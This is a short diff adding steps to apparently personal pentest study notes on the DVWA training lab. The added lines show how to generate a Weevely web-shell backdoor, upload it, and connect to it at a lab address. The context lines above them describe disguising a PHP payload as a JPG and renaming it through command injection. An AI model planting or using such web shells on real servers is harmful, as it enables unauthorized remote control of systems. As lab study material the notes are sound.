@@ -121,3 +121,9 @@ Other tools:
   If security level is high, we can upload payload.jpg to the server. Then use Command Injection to change the file name to payload.php on the server side. Then the same.
   
 ### Gain Backdoor Access via a Web Shell using Weevely
+  [link](https://www.kali.org/tools/weevely/)
+  
+  1. ``` weevely generate (backdoor password) (output file Path) ```
+  2. upload backdoor to server.
+  3. ``` weevely http://10.10.10.16:8080/dvwa/hackable/uploads/shell.php (backdoor password) ```
+  4. weevely connect to the server.
